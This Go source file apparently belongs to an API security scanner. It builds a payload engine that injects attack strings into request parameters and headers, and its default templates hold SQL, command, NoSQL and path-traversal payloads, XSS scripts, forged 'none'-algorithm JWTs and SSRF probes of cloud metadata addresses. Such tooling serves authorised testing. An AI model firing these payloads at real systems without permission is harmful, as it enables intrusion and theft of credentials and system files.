package injection

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"

	"github.com/assetnote/kiterunner2/pkg/log"
)

// PayloadTemplate represents a template for parameter injection
type PayloadTemplate struct {
	Name        string            `json:"name"`
	Description string            `json:"description"`
	Category    string            `json:"category"`
	Payloads    []string          `json:"payloads"`
	Headers     map[string]string `json:"headers,omitempty"`
	QueryParams map[string]string `json:"query_params,omitempty"`
	BodyParams  map[string]string `json:"body_params,omitempty"`
	PathParams  map[string]string `json:"path_params,omitempty"`
	Enabled     bool              `json:"enabled"`
	Risk        string            `json:"risk,omitempty"`
}

// PayloadEngine handles parameter injection based on templates
type PayloadEngine struct {
	Templates     []PayloadTemplate
	TemplatesFile string
	mutex         sync.RWMutex
}

// NewPayloadEngine creates a new payload engine
func NewPayloadEngine(templatesFile string) (*PayloadEngine, error) {
	engine := &PayloadEngine{
		TemplatesFile: templatesFile,
	}

	// Load templates if file exists
	if _, err := os.Stat(templatesFile); err == nil {
		if err := engine.LoadTemplates(); err != nil {
			return nil, err
		}
	} else {
		// Create default templates if file doesn't exist
		if err := engine.CreateDefaultTemplates(); err != nil {
			return nil, err
		}
	}

	return engine, nil
}

// LoadTemplates loads payload templates from the templates file
func (p *PayloadEngine) LoadTemplates() error {
	p.mutex.Lock()
	defer p.mutex.Unlock()

	data, err := ioutil.ReadFile(p.TemplatesFile)
	if err != nil {
		return fmt.Errorf("failed to read templates file: %v", err)
	}

	if err := json.Unmarshal(data, &p.Templates); err != nil {
		return fmt.Errorf("failed to parse templates file: %v", err)
	}

	log.Info().Int("count", len(p.Templates)).Str("file", p.TemplatesFile).Msg("Loaded payload templates")
	return nil
}

// SaveTemplates saves the current templates to the templates file
func (p *PayloadEngine) SaveTemplates() error {
	p.mutex.RLock()
	defer p.mutex.RUnlock()

	data, err := json.MarshalIndent(p.Templates, "", "  ")
	if err != nil {
		return fmt.Errorf("failed to marshal templates: %v", err)
	}

	if err := ioutil.WriteFile(p.TemplatesFile, data, 0644); err != nil {
		return fmt.Errorf("failed to write templates file: %v", err)
	}

	log.Info().Int("count", len(p.Templates)).Str("file", p.TemplatesFile).Msg("Saved payload templates")
	return nil
}

// CreateDefaultTemplates creates default payload templates
func (p *PayloadEngine) CreateDefaultTemplates() error {
	p.mutex.Lock()
	defer p.mutex.Unlock()

	p.Templates = []PayloadTemplate{
		{
			Name:        "SQL Injection - Basic",
			Description: "Basic SQL injection payloads",
			Category:    "sql-injection",
			Payloads: []string{
				"'", "\"", "' OR '1'='1", "' OR 1=1--",
				"admin'--", "1' OR '1' = '1", "' UNION SELECT 1,2,3--",
			},
			Enabled: true,
			Risk:    "high",
		},
		{
			Name:        "XSS - Basic",
			Description: "Basic cross-site scripting payloads",
			Category:    "xss",
			Payloads: []string{
				"<script>alert(1)</script>",
				"<img src=x onerror=alert(1)>",
				"javascript:alert(1)",
				"\"><script>alert(1)</script>",
			},
			Enabled: true,
			Risk:    "medium",
		},
		{
			Name:        "Command Injection",
			Description: "Command injection payloads",
			Category:    "command-injection",
			Payloads: []string{
				"; ls", "| ls", "& ls", "&& ls", "|| ls",
				"; id", "| id", "`id`", "$(id)",
			},
			Enabled: true,
			Risk:    "critical",
		},
		{
			Name:        "Path Traversal",
			Description: "Path traversal payloads",
			Category:    "path-traversal",
			Payloads: []string{
				"../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
				"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
				"....//....//....//etc/passwd",
			},
			Enabled: true,
			Risk:    "high",
		},
		{
			Name:        "JWT Manipulation",
			Description: "JWT token manipulation payloads",
			Category:    "jwt",
			Payloads: []string{
				"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
				"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0.KDlTtXchhZTGufMYmOYGS4HffxPSUrfmqCHXaI9wOGY",
			},
			Headers: map[string]string{
				"Authorization": "Bearer {{payload}}",
			},
			Enabled: true,
			Risk:    "critical",
		},
		{
			Name:        "GraphQL Introspection",
			Description: "GraphQL introspection queries",
			Category:    "graphql",
			Payloads: []string{
				`{"query": "{ __schema { queryType { name } } }"}`,
				`{"query": "{ __schema { types { name kind description } } }"}`,
			},
			Headers: map[string]string{
				"Content-Type": "application/json",
			},
			Enabled: true,
			Risk:    "medium",
		},
		{
			Name:        "SSRF",
			Description: "Server-side request forgery payloads",
			Category:    "ssrf",
			Payloads: []string{
				"http://localhost", "http://127.0.0.1", "http://[::1]",
				"http://169.254.169.254/latest/meta-data/",
				"http://metadata.google.internal/",
			},
			Enabled: true,
			Risk:    "high",
		},
		{
			Name:        "NoSQL Injection",
			Description: "NoSQL injection payloads",
			Category:    "nosql-injection",
			Payloads: []string{
				`{"$gt": ""}`, `{"$ne": null}`, `{"$exists": true}`,
				`{"$where": "1==1"}`, `{"$regex": ".*"}`,
			},
			Enabled: true,
			Risk:    "high",
		},
	}

	return p.SaveTemplates()
}

// GetTemplatesByCategory returns templates filtered by category
func (p *PayloadEngine) GetTemplatesByCategory(category string) []PayloadTemplate {
	p.mutex.RLock()
	defer p.mutex.RUnlock()

	var result []PayloadTemplate
	for _, template := range p.Templates {
		if template.Enabled && (category == "" || template.Category == category) {
			result = append(result, template)
		}
	}
	return result
}

// InjectPayloads injects payloads into a URL based on templates
func (p *PayloadEngine) InjectPayloads(targetURL string, categories []string) []string {
	p.mutex.RLock()
	defer p.mutex.RUnlock()

	var injectedURLs []string
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		log.Error().Err(err).Str("url", targetURL).Msg("Failed to parse URL for payload injection")
		return injectedURLs
	}

	// Get templates for the specified categories
	var templates []PayloadTemplate
	if len(categories) == 0 {
		// Use all enabled templates if no categories specified
		for _, template := range p.Templates {
			if template.Enabled {
				templates = append(templates, template)
			}
		}
	} else {
		// Filter templates by categories
		for _, template := range p.Templates {
			if template.Enabled {
				for _, category := range categories {
					if template.Category == category {
						templates = append(templates, template)
						break
					}
				}
			}
		}
	}

	// Process each template
	for _, template := range templates {
		// Process each payload in the template
		for _, payload := range template.Payloads {
			// Inject into query parameters
			if len(template.QueryParams) > 0 {
				query := parsedURL.Query()
				for paramName, paramValue := range template.QueryParams {
					// Replace {{payload}} placeholder with actual payload
					value := strings.ReplaceAll(paramValue, "{{payload}}", payload)
					query.Set(paramName, value)
				}
				parsedURL.RawQuery = query.Encode()
				injectedURLs = append(injectedURLs, parsedURL.String())
			} else {
				// If no specific query params defined, try injecting into all existing query params
				query := parsedURL.Query()
				if len(query) > 0 {
					for param := range query {
						originalValue := query.Get(param)
						query.Set(param, payload)
						parsedURL.RawQuery = query.Encode()
						injectedURLs = append(injectedURLs, parsedURL.String())

						// Restore original value for next iteration
						query.Set(param, originalValue)
					}
				} else {
					// If no query params exist, add a generic one
					parsedURL.RawQuery = "param=" + url.QueryEscape(payload)
					injectedURLs = append(injectedURLs, parsedURL.String())
					parsedURL.RawQuery = "" // Reset for next iteration
				}
			}

			// Inject into path parameters if defined
			if len(template.PathParams) > 0 {
				path := parsedURL.Path
				for paramPattern, paramValue := range template.PathParams {
					// Replace {{payload}} placeholder with actual payload
					value := strings.ReplaceAll(paramValue, "{{payload}}", payload)

					// Use regex to find and replace path parameters
					re := regexp.MustCompile(paramPattern)
					if re.MatchString(path) {
						newPath := re.ReplaceAllString(path, value)
						parsedURL.Path = newPath
						injectedURLs = append(injectedURLs, parsedURL.String())
						parsedURL.Path = path // Reset for next iteration
					}
				}
			}
		}
	}

	return injectedURLs
}

// GenerateRequestsWithPayloads generates HTTP requests with injected payloads
func (p *PayloadEngine) GenerateRequestsWithPayloads(targetURL, method string, categories []string) []InjectionRequest {
	p.mutex.RLock()
	defer p.mutex.RUnlock()

	var requests []InjectionRequest
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		log.Error().Err(err).Str("url", targetURL).Msg("Failed to parse URL for payload injection")
		return requests
	}

	// Get templates for the specified categories
	var templates []PayloadTemplate
	if len(categories) == 0 {
		// Use all enabled templates if no categories specified
		for _, template := range p.Templates {
			if template.Enabled {
				templates = append(templates, template)
			}
		}
	} else {
		// Filter templates by categories
		for _, template := range p.Templates {
			if template.Enabled {
				for _, category := range categories {
					if template.Category == category {
						templates = append(templates, template)
						break
					}
				}
			}
		}
	}

	// Process each template
	for _, template := range templates {
		// Process each payload in the template
		for _, payload := range template.Payloads {
			// Create a new request
			request := InjectionRequest{
				URL:     targetURL,
				Method:  method,
				Headers: make(map[string]string),
				Payload: payload,
			}

			// Apply template headers
			for headerName, headerValue := range template.Headers {
				// Replace {{payload}} placeholder with actual payload
				value := strings.ReplaceAll(headerValue, "{{payload}}", payload)
				request.Headers[headerName] = value
			}

			// Apply query parameters
			if len(template.QueryParams) > 0 {
				query := parsedURL.Query()
				for paramName, paramValue := range template.QueryParams {
					// Replace {{payload}} placeholder with actual payload
					value := strings.ReplaceAll(paramValue, "{{payload}}", payload)
					query.Set(paramName, value)
				}
				parsedURL.RawQuery = query.Encode()
				request.URL = parsedURL.String()
			}

			// Apply body parameters
			if len(template.BodyParams) > 0 {
				bodyParams := make(map[string]string)
				for paramName, paramValue := range template.BodyParams {
					// Replace {{payload}} placeholder with actual payload
					value := strings.ReplaceAll(paramValue, "{{payload}}", payload)
					bodyParams[paramName] = value
				}

				// Convert body parameters to JSON
				bodyJSON, err := json.Marshal(bodyParams)
				if err == nil {
					request.Body = string(bodyJSON)
					if request.Headers["Content-Type"] == "" {
						request.Headers["Content-Type"] = "application/json"
					}
				}
			}

			requests = append(requests, request)
		}
	}

	return requests
}

// InjectionRequest represents an HTTP request with injected payloads
type InjectionRequest struct {
	URL     string            `json:"url"`
	Method  string            `json:"method"`
	Headers map[string]string `json:"headers"`
	Body    string            `json:"body,omitempty"`
	Payload string            `json:"payload"`
}
